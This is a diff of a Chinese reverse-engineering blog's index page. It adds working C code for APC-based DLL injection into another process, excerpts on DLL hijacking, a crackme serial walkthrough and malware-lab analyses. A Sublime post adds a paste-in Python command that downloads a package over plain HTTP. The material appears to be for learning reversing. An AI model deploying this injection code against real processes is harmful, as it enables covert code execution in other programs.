+    PVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    DWORD dwRet;
+    if (lpData)
+    &#123;
+        //在远程进程申请空间写入待注入dll 的路径
+        WriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, &amp;dwRet);
+        CloseHandle(hProcess);
+    &#125;
+    //开始注入
+    THREADENTRY32 te = &#123; sizeof(te) &#125;;
+    HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//遍历系统中所有线程
+    if (handleSnap == INVALID_HANDLE_VALUE)
+    &#123;
+        return false;
+    &#125;
+    bool bstat = false;
+    if (Thread32First(handleSnap, &amp;te))
+    &#123;
+        do &#123;
+            if (te.th32OwnerProcessID == dwProcessId)
+            &#123;
+                HANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+                if (handleThread)
+                &#123;
+                    DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData);
+                &#125;
+                if (dwRet &gt; 0)
+                &#123;
+                    bstat = TRUE;
+                &#125;
+                CloseHandle(handleThread);
+            &#125;
+        &#125; while (Thread32Next(handleSnap, &amp;te));
+        CloseHandle(handleSnap);
+        return bstat;
+    &#125;
+
+    &#125;
+    int main()
+    &#123;
+        Injection_APC(L&quot;testapc.exe&quot;, L&quot;testapcdll.dll&quot;);
+        return 0;
+    &#125;
+</code></pre>
+<p>测试exe程序：</p>
+<pre><code>    #include&lt;windows.h&gt;
+    int main()
+    &#123;
+        MessageBox(NULL, L&quot;start&quot;, L&quot;tit&quot;, MB_OK);
+        SleepEx(1000 * 60 * 5, true);
+        MessageBox(NULL, L&quot;end&quot;, L&quot;tit&quot;, MB_OK);
+        Sleep(-1);
+    &#125;
+</code></pre>
+<p>测试dll 程序：</p>
+<pre><code>#include&lt;windows.h&gt;
+#include&quot;dll.h&quot;
+BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved)
+&#123;
+    switch (dwReason)
+    &#123;
+        // 动态链接库映射到某个进程的地址空间
+    case DLL_PROCESS_ATTACH:
+        MessageBox(NULL, L&quot;in apc ok~&quot;, L&quot;tit&quot;, MB_OK);
+        /**
+        * 当DLL刚被加载时触发（LoadLibrary），此处专门用来做初始化工作，
+        * 如果初始化失败可以返回 false 这样DLL就不会被继续加载了
+        **/
+        break;
+
+        // 应用程序创建新的线程
+    case DLL_THREAD_ATTACH:
+
+        break;
+
+        // 应用程序某个线程正常终止
+    case DLL_THREAD_DETACH:
+
+        break;
+
+        // 动态链接库将被卸载
+    case DLL_PROCESS_DETACH:
+        /**
+        * 当DLL将要被卸载时触发（FreeLibrary）,此处专门用来做清理工作
+        * 如关闭文件，释放内存空间等
+        **/
+        break;
+    &#125;
+    return 1;
+&#125;
+/*
+void helloDLL(void)
+&#123;
+//MessageBox(NULL, TEXT(&quot;Hello DLL~&quot;), TEXT(&quot;Title&quot;), MB_OK);
+&#125;*/
+</code></pre>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2017/09/16/%E9%80%86%E5%90%91/dll%E4%B9%8BAPC%E6%B3%A8%E5%85%A5/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/09/14/%E7%BC%96%E7%A8%8B/vs%E9%94%99%E8%AF%AF%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="fengchuiguo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fengchuiguo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/09/14/%E7%BC%96%E7%A8%8B/vs%E9%94%99%E8%AF%AF%E9%9B%86/" class="post-title-link" itemprop="url">VS错误集</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-09-14 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-14T00:00:00+08:00">2017-09-14</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -384,397 +968,32 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>1.MOVSX  带符号扩展指令</p>
-<pre><code>MOV BL,80H   
-MOVSX  AX,BL
-AX=0FF80H
-因为带符号扩展的时候，高位视为符号位，扩展的高位全置1
-</code></pre>
-<p>2.neg eax  sbb eax ,eax</p>
-<pre><code>例如 
-neg r
-sbb r-r
-neg eax 就是0-eax 其实际上就是设置标志位 cf=1 
-sbb eax,eax 就是eax-eax-cf
-如果r=0; cf=0 ;最后结果就是把r 设为0，如果r不等于0，则cf=1
-相当于r-r-cf=-1=oxffffffff
-注意：
- MOVzX  无符号扩展指令
-</code></pre>
-<p>3.test 指令</p>
-<pre><code>test eax,eax 基本上和 And eax,eax 是一样的，不同的是test 不改变eax的结果，只是改变FLAG寄存器的状态，也就是改变进位标志，零标志，溢出标志等 等。举一个例子，如果eax=01h,test eax,eax 就是两个01h 作与操作，所以结果还是01h,不是0的话，就不会跳转 je  xxxx。所以要跳转je xxxx,只有一种可能就是eax=0h.所以现在eax=0x01 则不会跳转 je  xxxx
-</code></pre>
-<p>4.__alloca_probe</p>
-<pre><code>逆向vc编译的程序，经常会看到这样的代码出现在函数头部：
-
-mov     eax, xxxxh
-call    __alloca_probe
-
-xxxxh是个立即数，一般大于1000h,即十进制数4096。
-
-这段代码经常出现在函数头prolog之后，如果有异常结构，会出现在SEH或EH之后。
-
-示例1：
-                 push    ebp
-                 mov     ebp, esp
-                 mov     eax, 8080h
-                 call    __alloca_probe
-                 
-示例2：
-                 push    ebp
-                 mov     ebp, esp
-                 and     esp, 0FFFFFFF8h
-                 push    0FFFFFFFFh
-                 push    offset SEH_4A7AA0
-                 mov     eax, large fs:0
-                 push    eax
-                 mov     large fs:0, esp
-                 push    ecx
-                 mov     eax, 8080h
-                 call    __alloca_probe
-                 
-事实上__alloca_probe是一个在stack上分配大块内存空间函数，功能同SUB ESP, xxxxh一致。函数本身由编译器提供，编译的时候vc会根据实际情况（stack上申请大块空间，一般大于一个内存页大小）插入到函数体，为函数在stack上提供私有变量空间，分配的空间大小由fastcall调用方式的EAX寄存器传入。
-</code></pre>
-<p>5.chkstk函数</p>
-<pre><code>分配较大局部变量空间时chkstk函数来检测是否超过堆栈上已经分配的空间
-
-
-我的理解就是ecx保存未调用此函数前esp的值，随后每次减去一页的空间也就是1000h,
-eax保存的就是所有要分配的空间，每次分配一页之后也减去1000h,然后比较eax和1000h的值，看是否还需要一页，如果大于1000h,继续循环。否则用ecx减去eax得到最终分配的空间栈顶位置，然后把ecx的值赋给esp,跳回函数的返回地址，结束分配。
-</code></pre>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2017/08/06/%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/08/06/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="fengchuiguo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="fengchuiguo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2017/08/06/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/" class="post-title-link" itemprop="url">进程替换的一种方式</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2017-08-06 00:00:00" itemprop="dateCreated datePublished" datetime="2017-08-06T00:00:00+08:00">2017-08-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>进程替换问题</p>
-<p>svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。</p>
-<p><img src="http://i.imgur.com/3u192lY.png"></p>
-
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2017/08/06/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/08/03/dll%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8A%AB%E6%8C%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="fengchuiguo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="fengchuiguo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2017/08/03/dll%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">dll加载和劫持</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2017-08-03 00:00:00" itemprop="dateCreated datePublished" datetime="2017-08-03T00:00:00+08:00">2017-08-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>一.dll加载顺序</p>
-<ol>
-<li>DLL查找路径基础</li>
-</ol>
-<p>&amp;emsp;&amp;emsp;应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。</p>
-<p>&amp;emsp;&amp;emsp;对于以下两种情况的DLL，系统将不会查找，而是直接加载：</p>
-<p>&amp;emsp;&amp;emsp;a. 对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。）</p>
-<p>&amp;emsp;&amp;emsp;b. 如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs。</p>
-<p>&amp;emsp;&amp;emsp;这里有个比较坑的地方，对于有依赖项的DLL（即使使用全路径指定DLL位置），系统查找其所依赖DLL的方法是按照实际的模块名称来的，因此如果加载的DLL不在系统查找顺序目录下，那么动态加载该DLL（LoadLibrary）会返回一个”找不到模块”的错误。</p>
-<p>2.系统标准DLL查找顺序</p>
-<p>&amp;emsp;&amp;emsp;系统使用的标准DLL查找顺序依赖于是否设置了”安全DLL查找模式”（safe DLL search mode）。”安全DLL查找模式”会将用户当前目录置于查找顺序的后边。<br>“安全DLL查找模式”默认是启用的，禁用的话，可以将注册表项HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode设为0。调用SetDllDirectory函数可以禁用”安全DLL查找模式”，并修改DLL查找顺序。<br>Windows XP下，”安全DLL查找模式”默认是禁用的，需要启用该项的话，在注册表中新建一个SafeDllSearchMode子项，并赋值为1即可。”安全DLL查找模式”从Windows XP SP2开始，默认是启用的。</p>
-<p>&amp;emsp;&amp;emsp;启用”安全DLL查找模式”时，查找顺序如下：</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2017/08/03/dll%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8A%AB%E6%8C%81/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/08/01/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84crackme/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="fengchuiguo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="fengchuiguo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2017/08/01/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84crackme/" class="post-title-link" itemprop="url">一个简单的crackme</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2017-08-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-08-01T00:00:00+08:00">2017-08-01</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>一、样本基本信息</p>
-<p>程序链接    <a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1bSPUdK">http://pan.baidu.com/s/1bSPUdK</a></p>
-<p>二、分析过程</p>
-<p>这是一个vb程序，ida不能看出什么，只能靠OD了。首先打开程序查看界面以及填入name和serial后的弹出的关键字符串。</p>
-<p>打开OD，定位关键字符串的位置，然后寻找关键跳转，发现是在0040258b的位置，往前看是test esi，esi 。</p>
-<p><img src="http://i.imgur.com/zNx08T2.png"></p>
-<p>寻找一下esi的来源，发现时00402533位置的比较字符串函数的返回值，在此处下断点，在堆栈中发现了两个字符串AKA-585235和111111，一个是我们输入的serial,另一个应该我输入的name处理后的结果，继续向上寻找这个字符串的来源。在00402523位置的函数时一个字符串连接函数，把AKA和585235连接在一起，</p>
-<p><img src="http://i.imgur.com/L7OC3u0.png"></p>
-<p>继续往前找585235的位置，发现在4024f4d处的函数调用以后，在堆栈中出现了585235，记下它的地址0014e3dc，</p>
-<p><img src="http://i.imgur.com/XvyRwWc.png"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2017/08/01/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84crackme/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/08/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="fengchuiguo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="fengchuiguo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2017/08/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%AE%B0/" class="post-title-link" itemprop="url">恶意代码分析第一记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2017-08-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-08-01T00:00:00+08:00">2017-08-01</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>一、样本基本信息</p>
-<p>分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe</p>
-<p>二、分析过程</p>
-<p>首先在虚拟机里准备好必要的工具，<br>静态分析工具包括 PEView、strings、(IDA)、,Dependency Walkler、Resource Hacker、PEID、PEexplorer等。</p>
-<p>动态分析工具包括process monitor,process explorer,ApateDNS,RegShot等。</p>
+          <p>一 .无法解析的外部符号 _main，该符号在函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中被引用window	F:\c\window\window\MSVCRTD.lib(exe_main.obj)	</p>
+<p>&amp;emsp;&amp;emsp;原因是c语言程序找不到适当的入口程序函数	<br>般情况下，</p>
+<p>&amp;emsp;&amp;emsp;如果是windows程序，那么WinMain是入口函数，在VS2017中新建项目为“win32项目”</p>
+<p>&amp;emsp;&amp;emsp;如果是dos控制台程序，那么main是入口函数，在VS2017中新建项目为“win32控制台应用程序”而如果入口函数指定不当，很显然c语言运行时找不到配合函数，它就会报告错误。修改设置适应你的需求</p>
+<p>&amp;emsp;&amp;emsp;如果是windows程序：</p>
 <ul>
-<li>静态分析步骤：</li>
+<li><p>1.菜单中选择 工程-&gt;属性, 弹出属性窗口</p>
+</li>
+<li><p>2.在左边栏中依次选择：配置属性-&gt;C&#x2F;C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_CONSOLE, 添加_WINDOWS.</p>
+</li>
+<li><p>3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为Windows(&#x2F;SUBSYSTEM:WINDOWS)<br>如果是控制台程序：</p>
+</li>
+<li><p>1.菜单中选择 工程-&gt;属性, 弹出弹出属性窗口</p>
+</li>
+<li><p>2.在左边栏中依次选择：配置属性-&gt;C&#x2F;C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_WINDOWS, 添加_CONSOLE.</p>
+</li>
+<li><p>3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为CONSOLE(&#x2F;SUBSYSTEM:CONSOLE)</p>
+</li>
 </ul>
-<p>•     PEID 查壳</p>
-<p><img src="https://i.imgur.com/4usSk9D.png" alt="img"></p>
-<p>发现是个加壳程序，估计导入表和字符串应该看不到什么有用的信息了。</p>
-<p>• PEVIew</p>
+<p>二  vs2015丢失msvcp140.dll 无法运行程序</p>
+<p>1.可以选择静态编译</p>
+<p><img src="https://i.imgur.com/hetjIa8.png"></p>
+<p>初始状态是这样的</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2017/08/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%AE%B0/#more" rel="contents">
+              <a class="btn" href="/2017/09/14/%E7%BC%96%E7%A8%8B/vs%E9%94%99%E8%AF%AF%E9%9B%86/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -798,7 +1017,7 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/08/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%BA%8C%E8%AE%B0/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/09/13/%E6%9D%82%E5%AD%A6/sublime%E4%B9%B1%E7%A0%81%E5%A4%84%E7%90%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -812,7 +1031,7 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2017/08/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%BA%8C%E8%AE%B0/" class="post-title-link" itemprop="url">恶意代码分析第二记</a>
+            <a href="/2017/09/13/%E6%9D%82%E5%AD%A6/sublime%E4%B9%B1%E7%A0%81%E5%A4%84%E7%90%86/" class="post-title-link" itemprop="url">sublime中文乱码处理</a>
         </h2>
 
         <div class="post-meta">
@@ -822,7 +1041,7 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2017-08-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-08-01T00:00:00+08:00">2017-08-01</time>
+              <time title="创建时间：2017-09-13 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-13T00:00:00+08:00">2017-09-13</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -830,7 +1049,7 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+                  <a href="/categories/%E6%9D%82%E5%AD%A6/" itemprop="url" rel="index"><span itemprop="name">杂学</span></a>
                 </span>
             </span>
 
@@ -845,19 +1064,16 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>一、样本基本信息</p>
-<p>.样本来源于恶意代码分析实战的第七章的实验样本lab07-03.exe,lab07-03.dll.</p>
-<p>二、分析过程</p>
-<p>首先查看下有什么关键字符串。strings.exe 程序查看lab07-03.exe 的字符串，发现有文件映射的一系列函数，CreateFileMappingA,UnmapViewOfFile,MapViewOfFile等，以及遍历文件的函数FindFirstFileA,FindNextFileA,FindClose,另外还有复制文件的函数和创建文件的函数等，没发现什么网络特征。再看下lab07-03.dll的字符串，首先是创建进程的函数CreateProcessA，然后是互斥体的函数CreateMutexA,OpenMutexA,等函数,此外发现了一些网络特征，ip地址 127.26.152.13，以及实现网络功能的库WS2_32.dll,还有一些字符串比较函数strcmp.</p>
-<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/wiWLOYN.png" alt="img"></p>
-<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/3SglnDX.png" alt="img"></p>
-<p>然后查看lab07-03.exe的导入表，可以看到前面所叙述的函数，同时应注意到，导入表中并没有LoadLibrary或者GetProcAddress函数，说明dll文件并没有在运行时加载。查看lab07-03.dll文件发现很多网络特征，很多网络函数，包括WSAStartup,socket,send,connect,recv等。</p>
-<p><img src="http://i.imgur.com/NPtmzMv.png"></p>
-<p><img src="http://i.imgur.com/pa6CXX9.png"></p>
-<p>查看完这些后，心中稍微有点底，然后运行程序进行动态分析，配置网络环境ApateDNS,监控软件等。运行完程序发现秒退，什么也没有发生，process monitor和process explorer也什么没监控到，也没什么网络活动。猜测可能会有命令行参数。<br>对lab07-03.exe进行逆向分析。载入IDA，进入主函数，发现果然有验证，判断参数是否为2，并且第二个参数是否“WARNING_THIS_WILL_DESTROY_YOUR_MACHINE”然后下面就是文件映射的操作了，对’C:\Windows\System32\Kernel32.dll 和lab07-03.dll进行了一系列的文件读写操作，这部分详情分析有点困难，我们留到动态分析的时候再来做。最后把文件lab07-03.dll拷贝到’C:\Windows\System32\Kerne132.dll中。继续往下看，是一个函数4011e0,参数是c盘根目录，跟进去看一下发现是一个遍历文件夹的操作。判断是否是.exe文件，然后是进行内存映射，查找kernel32.dll字符串改为kerne132.dll字符串。意图很明显了，让c盘目录下的exe文件加载山寨的kerne132.dll。</p>
+          <p>一、安装包管理器<br>使用Ctrl+~快捷键或者通过View-&gt;Show Console菜单打开命令行，粘贴如下代码</p>
+<pre><code>import urllib.request,os; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &#39;wb&#39;).write(urllib.request.urlopen( &#39;http://sublime.wbond.net/&#39; + pf.replace(&#39; &#39;,&#39; &#39;)).read())
+</code></pre>
+<p>顺利的话，此时就可以在Preferences菜单下看到Package Settings和Package Control两个菜单了</p>
+<p>二、安装乱码处理插件：</p>
+<p>    调用ctrl+shift+p,输入：install package，回车，在稍后弹出的安装包框中搜索：ConvertToUTF8或者GBK Encoding Support，选择点击安装；</p>
+
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2017/08/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%BA%8C%E8%AE%B0/#more" rel="contents">
+              <a class="btn" href="/2017/09/13/%E6%9D%82%E5%AD%A6/sublime%E4%B9%B1%E7%A0%81%E5%A4%84%E7%90%86/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -881,7 +1097,7 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/08/01/%E8%BF%B7%E8%B7%AF/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/08/09/%E9%80%86%E5%90%91/%E5%B8%B8%E8%A7%84%E8%84%B1%E5%A3%B3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -895,7 +1111,7 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2017/08/01/%E8%BF%B7%E8%B7%AF/" class="post-title-link" itemprop="url">迷路</a>
+            <a href="/2017/08/09/%E9%80%86%E5%90%91/%E5%B8%B8%E8%A7%84%E8%84%B1%E5%A3%B3/" class="post-title-link" itemprop="url">常规脱壳</a>
         </h2>
 
         <div class="post-meta">
@@ -905,7 +1121,7 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2017-08-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-08-01T00:00:00+08:00">2017-08-01</time>
